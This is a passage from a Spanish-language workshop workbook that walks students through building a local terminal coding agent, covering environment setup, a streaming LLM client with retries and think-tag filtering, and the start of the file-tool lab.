# Cuaderno del alumno · Forja: construye tu propio agente de código

> Workshop de 2 días. Al terminar tendrás **tu propio agente de código de terminal** —como los comerciales— funcionando con modelos abiertos en tu máquina, y entenderás cada pieza porque la habrás escrito tú.

## Cómo usar este cuaderno
- Cada lab: **objetivo → conceptos → lo que implementas → ejecuta → checkpoint → retos**.
- El código a completar está en `forja/` (busca `TODO NN.x`). Los tests de cada lab están en `tests/test_lNN_*.py`: `python scripts/tasks.py test NN`.
- Cuando los tests de un lab pasan, la capacidad se activa sola en tu CLI (`forja`). Los labs pendientes aparecen como avisos.
- ¿Te has quedado atrás? `python scripts/tasks.py catchup NN` copia la solución de los labs anteriores (con copia de seguridad de lo tuyo).
- Proyecto de prácticas: `playground/` (una mini librería de facturas con bugs a propósito). Para dejarlo como al principio: `python scripts/tasks.py reset`.

## Mapa
| Día | Lab | Tema | Lo que gana tu agente |
|---|---|---|---|
| 1 | 00 | Setup y primer contacto | — |
| 1 | 01 | Cliente LLM con streaming | chat en streaming |
| 1 | 02 | Tools de ficheros | leer, buscar y editar |
| 1 | 03 | El bucle del agente | actuar en bucle |
| 1 | 04 | Bash y permisos | ejecutar comandos con permisos |
| 1 | 05 | La CLI: tu agente de terminal | interfaz completa |
| 2 | 06 | Ingeniería de contexto | conoce tu proyecto |
| 2 | 07 | Gestión de contexto y compactación | sesiones largas |
| 2 | 08 | Planificar antes de actuar | planifica |
| 2 | 09 | Subagentes | delega |
| 2 | 10 | Extensibilidad: hooks, skills y MCP | hooks, skills, MCP |
| 2 | 11 | Sesiones y deshacer | reanudar y deshacer |
| 2 | 12 | Evals: medir tu agente | se mide |

---

## Lab 00 · Setup y primer contacto

*Día 1 · 09:00–09:30*

**Objetivo:** Tener Ollama con un modelo que sepa usar tools, el repo instalado y los tests ejecutándose.

### Conceptos
- **Qué vamos a construir:** *Forja*, un agente de código de terminal como los comerciales: lee y edita tu proyecto, ejecuta comandos, pide permiso, planifica, delega en subagentes y se extiende con hooks, skills y MCP. Funciona con modelos abiertos en tu máquina.
- **Agente = modelo + tools + bucle. Harness = todo lo demás** (permisos, contexto, interfaz, sesiones…). El modelo es una pieza intercambiable: el harness es lo que construimos.
- **Cómo funcionan los labs:** cada lab tiene funciones con `TODO` en `forja/` y tests en `tests/`. Cuando los tests pasan, la capacidad se enciende sola en tu CLI. ¿Te quedas atrás? `python scripts/tasks.py catchup NN`.
- **Modelos:** `qwen3:8b` (portátil de 16 GB), `qwen3-coder:30b` (Mac de 32 GB o GPU de 24 GB), o el servidor compartido del aula. OpenRouter solo con modelos open-weight.

### Lo que implementas
Este lab no tiene TODOs.

### Antes de empezar
- Necesitas tener instalados **Python 3.11+**, **git** y **Ollama** (o la dirección del servidor compartido de la sala). Compruébalo con `python --version` (macOS/Linux: `python3 --version`), `git --version` y `ollama --version`.
- Todo se ejecuta **desde la raíz del repo** mediante `python scripts/tasks.py …`, así los mismos comandos funcionan en Windows (PowerShell/cmd) y en macOS/Linux, sin `make`.
- Mapa del repo: `forja/` = TU código (funciones stub que lanzan `NotImplementedError("TODO NN.x")` con un comentario de pista encima), `tests/test_lNN_*.py` = tests offline por lab (usan `forja/fake_llm.py`, no hace falta modelo), `playground/` = pequeño proyecto de facturas con 3 bugs que arreglará tu agente, `labs/LNN_*/` = enunciados de los labs.
- Forja es **progresivo**: `forja/harness.py` captura `NotImplementedError` y sigue funcionando sin la pieza que falta, mostrando una nota como `· tools: lab 02 pending — running without this capability`. Cada lab que terminas enciende una capacidad en la CLI.

### Setup paso a paso
1. **Abre un terminal en la raíz del repo** (la carpeta con `pyproject.toml`).
  - Windows PowerShell: `cd C:\path\to\forja-workshop`
  - macOS/Linux: `cd ~/path/to/forja-workshop`
  - Resultado esperado: `dir` / `ls` muestra `forja`, `tests`, `playground`, `scripts`, `pyproject.toml`.
2. **Crea y activa un virtualenv.**
  - Windows PowerShell: `python -m venv .venv` y luego `.venv\Scripts\Activate.ps1`
    (si te sale *"running scripts is disabled on this system"*: `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned` y vuelve a activarlo).
  - Windows cmd.exe: `python -m venv .venv` y luego `.venv\Scripts\activate.bat`
  - macOS/Linux: `python3 -m venv .venv` y luego `source .venv/bin/activate`
  - Resultado esperado: tu prompt empieza por `(.venv)` y `python --version` muestra 3.11 o superior. A partir de ahora `python` (no `python3`) es el intérprete del venv en todos los sistemas.
3. **Instala Forja y crea `.env`:** `python scripts/tasks.py setup` (igual en todos los sistemas).
  - Resultado esperado: una primera línea `» …python -m pip install -e .[dev]`, la salida de pip terminando en `Successfully installed … forja-1.0.0 …`, y `created .env (review it)` la primera vez.
  - Comprueba: `forja --help` muestra `usage: forja [-h] [-p PROMPT] [--mode …]`.
4. **Elige tu backend en `.env`** (ábrelo con cualquier editor).
  - Portátil de 16 GB: `FORJA_BACKEND=ollama`, `FORJA_MODEL=qwen3:8b` (el valor por defecto).
  - Mac de 32 GB / GPU de 24 GB: `FORJA_MODEL=qwen3-coder:30b`.
  - Servidor compartido de la sala: descomenta el bloque `openai_compat` y pon `FORJA_BASE_URL` / `FORJA_MODEL` que te dé el tutor.
  - OpenRouter: solo modelos open-weight — `anthropic/*`, `openai/*`, `gpt-oss`, `o3`… están bloqueados en `forja/config.py` (`ModelPolicyError`).
5. **Descarga y prueba el modelo** (sáltatelo si usas el servidor compartido).
  - Todos los sistemas: `ollama pull qwen3:8b` → barras de progreso y luego `success`.
  - `ollama run qwen3:8b "hello"` → un saludo corto (qwen3 puede mostrar antes una sección *Thinking…*).
  - Mientras responde, en otro terminal: `ollama ps` → una fila con `qwen3:8b`, su SIZE y PROCESSOR (`100% GPU`, o un reparto CPU/GPU, que es más lento).
6. **Comprueba que el modelo sabe llamar a herramientas:** `forja doctor` (habla con el backend usando directamente el SDK `openai`, así que funciona antes del lab 01).
  - Resultado esperado:
    ```
    backend=ollama url=http://localhost:11434/v1 model=qwen3:8b
    answered in 4.2s · ~35 tok/s (includes loading)
    ✔ the model calls tools (ping)
    ```
  - `! the model answered without calling the tool` → el modelo no hace tool calling: elige otro. `✘ could not talk to the model` → Ollama no está en marcha o la URL de `.env` es incorrecta.
7. **Ejecuta los tests del taller:** `python scripts/tasks.py test`.
  - Resultado esperado: casi todo en rojo — alrededor de `58 failed, 7 passed`, cada fallo terminando en `NotImplementedError: TODO NN.x`. Es correcto: son tus TODOs.
  - Un solo lab: `python scripts/tasks.py test 01` → `9 failed, 5 passed` (los 5 verdes prueban código que se te da hecho).
8. **Ejecuta los tests del proyecto de prácticas** (el trabajo para tu agente):
  - Windows PowerShell: `cd playground; python -m pytest -q; cd ..`
  - macOS/Linux: `cd playground && python -m pytest -q; cd ..`
  - Resultado esperado: `3 failed, 4 passed` — `test_round_half_up`, `test_total_with_vat_cent` y `test_due_date_sunday_moves_to_monday`. No los arregles a mano: lo hará Forja.
9. **Abre la CLI una vez:** `forja --cwd playground`.
  - Resultado esperado: un banner cian `Forja 1.0.0 · qwen3:8b · mode default`, la ruta y `/help for commands`.
  - Escribe `hello` → `NotImplementedError: TODO 01.3` en rojo, más notas atenuadas `· … lab NN pending`. Correcto por ahora: el cliente en streaming es el lab 01. Sal con `/exit` o Ctrl+D (Windows: Ctrl+Z, Enter).

### Ejecuta
```bash
python -m venv .venv
.venv\Scripts\activate            # Windows   (Linux/macOS: source .venv/bin/activate)
python scripts/tasks.py setup      # instala y crea .env
ollama pull qwen3:8b               # o el modelo de tu nivel de hardware
python scripts/tasks.py test       # casi todo en rojo: es lo esperado
cd playground && python -m pytest -q   # 3 tests fallan: trabajo para tu agente
```

### Pruébalo en tu agente
1. Mira cómo el tutor ejecuta `python scripts/tasks.py demo`: el agente de referencia sobre `playground/`. Ese es tu agente al final del día 2.
2. Ejecuta `ollama ps` mientras `ollama run qwen3:8b "write a haiku"` está respondiendo: fíjate en GPU vs CPU y en la memoria usada.
3. Echa un vistazo a `forja/harness.py`, método `Forja.gate`: cada tool call pasa por parse → hook PreToolUse → permisos → aprobación → ejecución → hook PostToolUse. Cada paso es un lab.
4. Abre `forja/llm.py` y busca el primer comentario `# TODO 01.1:`: así es un stub de partida.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| PowerShell: `Activate.ps1 cannot be loaded because running scripts is disabled` | Política de ejecución → `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned`, o usa cmd.exe con `.venv\Scripts\activate.bat`. |
| `forja` is not recognized / `command not found: forja` | El venv no está activo o `setup` falló → actívalo y vuelve a ejecutar `python scripts/tasks.py setup`. `python -m forja` funciona como alternativa. |
| `ERROR: Package 'forja' requires a different Python` | Tu Python es anterior a 3.11 → instala 3.11+ y vuelve a crear `.venv` con él (Windows: `py -3.12 -m venv .venv`). |
| `forja doctor` → `✘ could not talk to the model: APIConnectionError` | Ollama no está en marcha o `OLLAMA_BASE_URL` es incorrecta → arranca la app de Ollama (o `ollama serve`) y comprueba que `http://localhost:11434` en un navegador dice *Ollama is running*. |
| `forja doctor` → `ModelPolicyError: model '…' blocked by policy` | Has elegido un id de modelo cerrado (anthropic/openai/gpt-oss/o3…) → usa un modelo open-weight. |
| `forja doctor` va muy lento la primera vez (30–90 s) | El modelo se está cargando en memoria → normal; la segunda llamada es rápida. Si sigue lento, `ollama ps` probablemente muestra CPU: usa un modelo más pequeño o el servidor compartido. |
| macOS: `python: command not found` | Fuera del venv macOS solo tiene `python3` → crea el venv con `python3 -m venv .venv`; una vez activo, `python` funciona. |

### Has terminado cuando
- [ ] [ ] `ollama run <your model> "hello"` responde (o el servidor compartido responde a `forja doctor`).
- [ ] [ ] `forja doctor` muestra `✔ the model calls tools`.
- [ ] [ ] `python scripts/tasks.py test` se ejecuta y muestra fallos rojos `NotImplementedError: TODO …`.
- [ ] [ ] Los tests de `playground` muestran exactamente 3 fallos.

### Checkpoint
`ollama run qwen3:8b "hola"` responde y `python scripts/tasks.py test` se ejecuta (en rojo, como debe ser). El tutor enseña `python scripts/tasks.py demo`: así será tu agente al final del día 2.

### Retos
1. Ejecuta `ollama ps` mientras el modelo responde: ¿va en GPU o CPU? ¿Cuánta memoria usa?
2. Lee `forja/harness.py` por encima: localiza la «puerta» por la que pasa cada tool call.


---

## Lab 01 · Cliente LLM con streaming

*Día 1 · 09:30–10:15*

**Objetivo:** Hablar con cualquier backend OpenAI-compatible en streaming y reconstruir las tool calls que llegan troceadas.

### Conceptos
- **Un protocolo, muchos backends:** Ollama, vLLM, LM Studio, llama.cpp y OpenRouter hablan Chat Completions. El SDK `openai` es solo un cliente HTTP; el modelo es abierto.
- **Streaming:** el texto llega token a token (la CLI se siente viva). Las **tool calls también llegan troceadas**: `index`, luego `id` y `name`, luego el JSON de argumentos en pedazos, a veces de varias llamadas intercaladas.
- **Rarezas de modelos locales:** bloques `<think>…</think>` que pueden partirse entre chunks; tool calls escritas como texto `<tool_call>{…}</tool_call>`.
- **Reintentos:** solo errores transitorios (conexión, 429, 5xx) con backoff exponencial. Un 400 no se arregla reintentando.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 01.1 | `forja/llm.py` | ToolCallAccumulator: concatenar fragmentos por índice |
| 01.2 | `forja/llm.py` | ThinkFilter: quitar <think> aunque la etiqueta llegue partida |
| 01.3 | `forja/llm.py` | LLMClient.stream: reintentos, eventos TextDelta y Done |

### Antes de empezar
- Abre `forja/llm.py` (tus tres TODOs), `forja/types.py` (`ToolCall`, `ChatResponse`, `TextDelta`, `Done` — ya hechos) y `tests/test_l01_llm.py`.
- Aquí el SDK `openai` es solo un cliente HTTP. Con `stream=True`, `client.chat.completions.create(**params)` devuelve un iterador de *chunks*. Cada chunk tiene `.model`, `.usage` (normalmente solo en el ÚLTIMO chunk, que tiene `choices == []`) y `.choices[0].delta` con `.content` (un trozo de texto o `None`) y `.tool_calls` (una lista de fragmentos o `None`). `.choices[0].finish_reason` viene informado en el último chunk de contenido.
- Un fragmento de tool call tiene `.index` (qué llamada), `.id` y `.function.name` (normalmente solo en el primer fragmento) y `.function.arguments` (un *trozo* de una cadena JSON). El test los simula con la clase `D`.
- Cómo encaja: `LLMClient.stream()` es el generador que consume el bucle del agente (lab 03). Emite `TextDelta(text)` para la UI durante el streaming y termina con UN `Done(ChatResponse(...))` con todo ensamblado. `chat()` (ya hecho) simplemente devuelve la respuesta del `Done`.
- Helpers ya hechos que reutilizarás: `self._params(messages, tools, **kw)` (construye el cuerpo de la petición, incluyendo `stream`, `stream_options`, `tools`, `tool_choice` y `extra_body`), `RETRYABLE` (las clases de excepción transitorias) y `rescue_text_tool_calls(text)`.

### Paso a paso
Haz primero 01.1 (acumulador): es pequeño, puro y se prueba de forma aislada. Luego 01.2 (filtro de think), también puro pero más delicado — dibuja en papel los estados del buffer. Termina con 01.3, que conecta ambos con el stream real; sus tests usan un `httpx.MockTransport`, así que sigues sin necesitar modelo. Ejecuta el comando de test de cada TODO antes de pasar al siguiente.

#### TODO 01.1 · `forja/llm.py` · `ToolCallAccumulator.add(deltas)` / `ToolCallAccumulator.finish()`

**Qué debe hacer:** `add(deltas: list | None) -> None` recibe el `delta.tool_calls` de UN chunk (puede ser `None`) y actualiza `self._parts: dict[int, dict[str, str]]`, un hueco por `index` con las claves `'id'`, `'name'`, `'arguments'`. `finish() -> list[ToolCall]` devuelve las llamadas completas ordenadas por índice, saltándose los huecos sin nombre; un id ausente se sustituye por uno generado no vacío, y los argumentos vacíos pasan a ser `'{}'`. `arguments` sigue siendo una **cadena** JSON en crudo.

**Pasos:**
1. En `add`, trata `None` como una lista vacía (el test llama a `acc.add(None)`).
2. Para cada fragmento, obtén (o crea) el hueco de `d.index` con cadenas vacías.
3. Si el fragmento tiene `id`, guárdalo (no sobrescribas un id guardado con `None`).
4. Si `d.function` no es `None`: CONCATENA `name` y `arguments` al hueco cuando vengan.
5. En `finish`, recorre los índices ordenados, sáltate los huecos con nombre vacío y construye `ToolCall(id or generated, name, arguments or '{}')`.

**Cuidado con:**
- Los fragmentos de llamadas distintas llegan intercalados (`test_accumulator_interleaved`): índice 0, luego 1, luego 0 y 1 otra vez en la misma lista. Indexa por `index`, nunca por orden de llegada.
- `function.arguments` puede ser `''` o `None`; `'' + None` lanza `TypeError` — compruébalo antes de sumar.
- No hagas `json.loads` de los argumentos aquí: `ToolCall.arguments` es la cadena en crudo; la validación se hace en el lab 02.
- `test_accumulator_empty_args_and_missing_id` comprueba `c.arguments == "{}"` y que `c.id` sea truthy (p. ej. `f"call_{uuid.uuid4().hex[:8]}"` — `uuid` ya está importado).

<details><summary>💡 Pista 1</summary>

`dict.setdefault(key, default)` devuelve el valor existente o inserta y devuelve el valor por defecto — perfecto para “obtener o crear el hueco”.

</details>

<details><summary>💡 Pista 2</summary>

Todo es concatenación de cadenas con `+=`. Los únicos casos especiales son los valores `None` y el nombre vacío en `finish`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
def add(self, deltas):
    for d in deltas or []:
        slot = ...  # setdefault by d.index
        # id: store if present
        # function: += name, += arguments (if present)

def finish(self):
    out = []
    for i in sorted(self._parts):
        ...  # skip nameless, build ToolCall
    return out
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l01_llm.py -k accumulator -v
```

#### TODO 01.2 · `forja/llm.py` · `ThinkFilter.feed(text)` (`flush()` ya está hecho)

**Qué debe hacer:** `feed(text: str) -> str` devuelve el texto VISIBLE que se puede imprimir ya. El estado vive en `self.buf` (texto aún sin decidir) y `self.in_think` (dentro de un bloque `<think>`). El texto dentro de `<think>…</think>` se descarta; todo lo que pueda ser el inicio de una etiqueta partida entre chunks se retiene en `buf` hasta la siguiente llamada. `flush()` (ya hecho) devuelve lo que queda en `buf` si no estamos dentro de un bloque think. Tests: `"".join(feed(c) for c in chunks) + flush()` sin saltos de línea debe ser igual a `"Hello"`, y `"a < b"` debe pasar sin tocarse.

**Pasos:**
1. Añade el texto nuevo a `self.buf`, prepara una lista de salida y repite mientras `buf` no esté vacío.
2. Fuera de un bloque think: busca `"<think>"` en `buf`. Si lo encuentras, emite todo lo anterior, corta `buf` tras la etiqueta, pon `in_think = True` y continúa el bucle.
3. Fuera y NO encontrado: comprueba si el FINAL de `buf` es un prefijo de `"<think>"` (`"<"`, `"<t"`, …, `"<think"`). Si lo es, emite todo salvo ese sufijo, deja el sufijo en `buf` y retorna. Si no, emite todo `buf` y vacíalo.
4. Dentro de un bloque think: busca `"</think>"`. Si lo encuentras, descarta todo hasta la etiqueta incluida (opcionalmente quita los `\n` iniciales), pon `in_think = False` y continúa el bucle.
5. Dentro y NO encontrado: descarta el buffer pero conserva sus últimos `len("</think>") - 1` caracteres (puede estar empezando una etiqueta de cierre) y devuelve lo que hayas emitido.
6. Devuelve la salida unida.

**Cuidado con:**
- Caso `["<thi", "nk>reasoning</th", "ink>Hel", "lo"]`: las dos etiquetas están partidas. Si emites `"<thi"` de inmediato, el test falla.
- Caso `["Hel", "lo<", "think>x</think>"]`: solo debes retener el `"<"`, y emitir igualmente `"lo"`.
- `test_think_filter_keeps_normal_lt`: `"a < b"` — el sufijo `"b"` no es prefijo de etiqueta, así que no se retiene nada. Retén solo un sufijo que cumpla `"<think>".startswith(...)`.
- Un chunk puede contener un bloque entero más texto detrás: usa un bucle `while`, no un único `if`.
- Comprueba primero el sufijo más largo posible (de 6 caracteres a 1), y nunca más de `len(buf)`.

<details><summary>💡 Pista 1</summary>

Piénsalo como una máquina de dos estados (fuera / dentro) con un buffer de caracteres sin decidir.

</details>

<details><summary>💡 Pista 2</summary>

`str.find` devuelve `-1` si no encuentra. `"<think>".startswith(self.buf[-k:])` te dice si los últimos `k` caracteres podrían ser el inicio de la etiqueta.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
self.buf += text
out = []
while self.buf:
    if self.in_think:
        end = self.buf.find("</think>")
        if end == -1:
            ...  # keep last 7 chars, return
        ...  # cut after the tag, in_think = False
    else:
        start = self.buf.find("<think>")
        if start == -1:
            ...  # hold back a tag prefix at the end, or emit all
        ...  # emit before tag, cut, in_think = True
return "".join(out)
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l01_llm.py -k think_filter -v
```

#### TODO 01.3 · `forja/llm.py` · `LLMClient.stream(messages, tools=None, **kw)`

**Qué debe hacer:** Un **generador** que emite `StreamEvent`s: cero o más `TextDelta(text)` (solo texto visible, tras `ThinkFilter`) y exactamente un `Done(ChatResponse(content or None, tool_calls, usage, model, finish_reason))` final. Reintenta solo las excepciones de `RETRYABLE`, como mucho `self.max_retries` intentos extra, esperando 1, 2, 4… segundos con `time.sleep`. `usage` debe ser exactamente `{"prompt_tokens": …, "completion_tokens": …}`. Si no llegaron tool calls nativas, prueba `rescue_text_tool_calls(content)`. `finish_reason` es `"tool_calls"` cuando hay llamadas; si no, el último que se haya visto.

**Pasos:**
1. Construye `params = self._params(messages, tools, **kw)`.
2. Bucle de reintentos: `for attempt in range(self.max_retries + 1)`, llama a `self._client.chat.completions.create(**params)`; si va bien, `break`; ante una excepción `RETRYABLE` relánzala si era el último intento; si no, `time.sleep(delay)` y duplica `delay` (empieza en 1).
3. Crea un `ToolCallAccumulator`, un `ThinkFilter`, una lista para el texto y valores por defecto para usage, finish reason y model (`self.model`).
4. Para cada chunk: lee PRIMERO `usage` (si viene) y `model` (si viene); luego sáltate los chunks sin `choices`; después toma `choices[0]`, guarda `finish_reason`, pasa `delta.content` por el filtro de think y haz `yield TextDelta(...)` si hay algo visible; pasa `delta.tool_calls` al acumulador.
5. Tras el bucle: `flush()` del filtro (emite también su cola), une el texto, `finish()` del acumulador; si no hay llamadas, usa `rescue_text_tool_calls`.
6. `yield Done(ChatResponse(...))`.

**Cuidado con:**
- El chunk de usage tiene `choices == []`: si haces `continue` antes de leer `usage`, `test_stream_text_and_tool_calls` falla en `r.usage`.
- Copia solo `prompt_tokens` y `completion_tokens` (el servidor también envía `total_tokens`; el test compara el dict entero).
- Llama a `time.sleep(...)` a través del módulo (`import time` ya está). Los tests hacen monkeypatch de `"time.sleep"`; con `from time import sleep` dormiría de verdad.
- `test_retries_on_503` espera exactamente 3 peticiones con `max_retries=2`. `test_no_retry_on_400` espera exactamente 1: un 400 lanza `openai.BadRequestError`, que NO está en `RETRYABLE`, así que deja que se propague. (Con el stub falla como `assert 0 == 1`: se lanza la excepción pero no se ha hecho ninguna petición.)
- No añadas tus propios reintentos en el SDK: el cliente se crea con `max_retries=0` a propósito.

<details><summary>💡 Pista 1</summary>

La función contiene `yield`, así que es un generador: no se ejecuta nada (ni siquiera la petición) hasta que alguien la itera.

</details>

<details><summary>💡 Pista 2</summary>

`except RETRYABLE:` funciona porque `RETRYABLE` es una tupla de clases de excepción. El texto y el contenido de la respuesta final son el mismo texto visible (`"Looking…"` en el test).

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
params = self._params(messages, tools, **kw)
delay = 1.0
for attempt in range(self.max_retries + 1):
    try: chunks = ...; break
    except RETRYABLE: ...  # raise on last attempt, else sleep and double
acc, think = ToolCallAccumulator(), ThinkFilter()
for ch in chunks:
    ...  # usage/model, skip no choices, text, tool calls
...  # flush, finish, rescue
yield Done(ChatResponse(...))
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l01_llm.py -k "stream or retr" -v
```

### Ejecuta
```bash
python scripts/tasks.py test 01
forja doctor                      # ¿el modelo llama tools?
forja                             # ya es un chat en streaming (aún sin tools)
```

### Pruébalo en tu agente
1. `python scripts/tasks.py test 01` → `14 passed`.
2. `forja --cwd playground` y pregunta `explain in 3 lines what an invoice due date is`. Deberías VER la respuesta aparecer progresivamente (token a token) y después un `(1 steps · 0 tools)` atenuado. No debe imprimirse texto de `<think>`.
3. Antes del prompt verás notas atenuadas como `· tools: lab 02 pending — running without this capability` y `· agent: lab 03 pending — chat mode without tools`: es lo esperado, por ahora es un chat sin más.
4. Comprueba los reintentos: apunta a un puerto muerto y observa cómo espera 1+2+4 s antes de fallar.
  - PowerShell: `$env:OLLAMA_BASE_URL="http://localhost:9999/v1"; forja --cwd playground` (después `Remove-Item Env:OLLAMA_BASE_URL`)
  - macOS/Linux: `OLLAMA_BASE_URL=http://localhost:9999/v1 forja --cwd playground`
  - Escribe `hi` → tras ~7 s, en rojo `APIConnectionError: Connection error.`
5. `forja doctor` sigue mostrando `✔ the model calls tools` (no usa tu cliente, así que es tu referencia cuando algo parece ir mal).

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `TypeError: can only concatenate str (not "NoneType") to str` en `add` | Un fragmento tiene `name` o `arguments` = `None` → concatena solo cuando el valor sea truthy. |
| El test del filtro de think falla con una salida como `<thiHello` o `Hel<` | Has emitido un posible prefijo de etiqueta en vez de retenerlo en `self.buf` → retén el sufijo más largo que cumpla `"<think>".startswith(...)`. |
| `test_think_filter_keeps_normal_lt` devuelve `"a "` o `""` | Retienes todos los `<` (o todo lo que va detrás) → retén solo un sufijo que sea prefijo de `<think>`; `flush()` devuelve el resto. |
| `test_retries_on_503` tarda 3 segundos o más | Has importado `sleep` directamente → llama a `time.sleep(...)` para que se aplique el monkeypatch. |
| `test_no_retry_on_400` falla con `assert 2 == 1` o `3 == 1` | Capturas `Exception` (u `openai.APIStatusError`) en el bucle de reintentos → captura solo `RETRYABLE`. |
| `AssertionError` en `r.usage == {...}` | Usage leído después del `if not ch.choices: continue`, o has copiado `total_tokens` → lee usage primero y copia dos claves. |
| En la CLI la respuesta aparece de golpe al final | Acumulas el texto y solo emites `Done` → haz `yield TextDelta(visible)` dentro del bucle de chunks. |
| En la CLI ves texto `<think>…` | El contenido no pasa por `ThinkFilter.feed`, o se llama a `flush()` estando en `in_think` y devuelve el buffer → revisa ambas cosas. (Algunas versiones de Ollama envían el razonamiento en un campo aparte: entonces no aparece nada, lo cual también está bien.) |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 01` → los 14 tests en verde.
- [ ] [ ] `forja --cwd playground` responde en streaming sin texto `<think>`.
- [ ] [ ] Sabes explicar por qué un 400 no se reintenta y un 503 sí.

### Checkpoint
`forja doctor` dice ✔ y `forja` responde en streaming. Aparecen avisos «lab NN pending»: es normal.

### Retos
1. Mide el *time-to-first-token* local frente a OpenRouter.
2. ¿Qué pasa si el modelo emite dos tool calls con el mismo `index`? ¿Puede ocurrir?

**Tests:** `tests/test_l01_llm.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 02`


---

## Lab 02 · Tools de ficheros

*Día 1 · 10:15–11:15*

**Objetivo:** Dar al agente ojos y manos sobre el proyecto: leer, buscar, crear y editar ficheros con seguridad.

### Conceptos
- **El schema es el prompt:** nombre, docstring y type hints generan el JSON Schema que lee el modelo. Una buena descripción vale más que cualquier instrucción en el system prompt.
- **Las tools nunca lanzan:** cualquier error vuelve al modelo como texto accionable ("aparece 3 veces: añade contexto") para que se corrija solo.
- **edit_file = sustitución exacta de un texto único.** Es el formato más robusto con modelos pequeños (los diffs los generan mal). Errores frecuentes del modelo: incluir los números de línea de `read_file` o cambiar la indentación.
- **Leer antes de editar** y detectar cambios externos (mtime): el agente no pisa lo que no ha visto ni lo que tú has cambiado.
- **Sandbox:** todas las rutas se resuelven dentro del workspace. `../` y rutas absolutas fuera, rechazadas.
- **Explorar sin cargar el repo:** `grep` y `glob` devuelven rutas y líneas; el agente solo lee lo relevante.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 02.1 | `forja/tools.py` | Tool.schema: JSON Schema en formato OpenAI |
| 02.2 | `forja/tools.py` | ToolRegistry.execute: ejecutar sin lanzar nunca |
| 02.3 | `forja/fs_tools.py` | Workspace.resolve: sandbox de rutas |
| 02.4 | `forja/fs_tools.py` | write_file: crear / reescribir con «leer antes» |
| 02.5 | `forja/fs_tools.py` | edit_file: sustitución exacta y única con errores útiles |
| 02.6 | `forja/fs_tools.py` | grep: búsqueda por regex en el workspace |

### Antes de empezar
- Abre `forja/tools.py` (TODOs 02.1–02.2), `forja/fs_tools.py` (02.3–02.6) y `tests/test_l02_tools.py`. Lee primero las partes ya hechas: el decorador `@tool` construye un modelo pydantic a partir de los type hints + el docstring (`Tool.args_model`), `ToolRegistry.parse_args(call)` valida los argumentos JSON, y `read_file` / `glob` son ejemplos completos de herramientas.
- Stdlib/APIs que usarás: pydantic `Model.model_json_schema()`; `json.dumps`; `time.perf_counter()`; `pathlib.Path.resolve()`, `.is_absolute()`, `.is_relative_to()`; `str.count`, `str.replace(old, new, 1)`; `re.compile`, `fnmatch.fnmatch`.
- Helpers de `Workspace` ya hechos que debes usar: `ws.resolve(path)` (tu 02.3), `ws.rel(p)` (cadena relativa), `ws.mark_read(p)` (recuerda el mtime), `ws.check_fresh(p)` (lanza `PermissionError` si no se ha leído o ha cambiado en disco), `ws.walk(base)` (ficheros, saltándose `.git`, `.venv`, `__pycache__`…), `ws.before_write` (callbacks, que usan los checkpoints del lab 11) y `unified_diff(before, after, path)`.
- Idea clave: las herramientas **lanzan** excepciones normales de Python con mensajes útiles; `ToolRegistry.execute` (02.2) lo captura todo y devuelve el mensaje al modelo como `ToolResult(ok=False, …)`. Así que las aserciones de los tests como `"before modifying" in res.output` comprueban TU texto de error pasado a través de `execute`.
- Cómo encaja: `schemas()` es lo que el modelo ve como `tools=[…]`; el gate del harness llama a `execute` por cada llamada que hace el modelo.

### Paso a paso
Primero 02.1 → 02.2 → 02.3: todos los tests de herramientas de ficheros pasan por `registry.execute` y `ws.resolve`, así que nada más puede pasar antes. Luego 02.4 (`write_file`), 02.5 (`edit_file`, la más grande) y 02.6 (`grep`). Ten `read_file` abierto como modelo de cómo se escribe una herramienta.

#### TODO 02.1 · `forja/tools.py` · `Tool.schema()`

**Qué debe hacer:** Devuelve `{"type": "function", "function": {"name": self.name, "description": self.description, "parameters": params}}` donde `params` es el JSON Schema de pydantic de `self.args_model` con: sin `"title"` en la raíz, sin `"title"` dentro de ninguna propiedad, `"additionalProperties": False`, y una clave `"properties"` incluso para herramientas sin argumentos. `test_schema_from_type_hints` comprueba el nombre, la descripción `"Does something."`, `required == ["path"]`, el default `3` de `n` y la descripción `"Path."` de `path`.

**Pasos:**
1. Obtén el dict del esquema con `self.args_model.model_json_schema()`.
2. Elimina el `title` raíz (usa `pop` con un valor por defecto para que nunca falle).
3. Recorre los valores de `params["properties"]` (puede no existir) y elimina cada `title`.
4. Asegúrate de que `properties` existe y pon `additionalProperties` a `False`.
5. Envuélvelo en el formato de función de OpenAI y devuélvelo.

**Cuidado con:**
- pydantic añade títulos como `"Path"`, `"N"` a cada propiedad: los modelos pequeños se lían con ellos, y el test comprueba que no haya título raíz.
- Una herramienta sin parámetros no tiene clave `properties`: algunos backends rechazan un esquema sin ella.
- pydantic ya genera las descripciones y `required` a partir del decorador `@tool`: no los reconstruyas a mano.

<details><summary>💡 Pista 1</summary>

Imprímelo primero: `python -c "from forja.fs_tools import *; from pathlib import Path; print(make_fs_tools(Workspace(Path('.')))[0].args_model.model_json_schema())"`.

</details>

<details><summary>💡 Pista 2</summary>

`dict.pop("title", None)` y `dict.setdefault("properties", {})` hacen casi todo el trabajo.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
params = self.args_model.model_json_schema()
# drop root title
for prop in params.get("properties", {}).values():
    ...
# ensure properties, additionalProperties
return {"type": "function", "function": {...}}
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k schema -v
```

#### TODO 02.2 · `forja/tools.py` · `ToolRegistry.execute(call)`

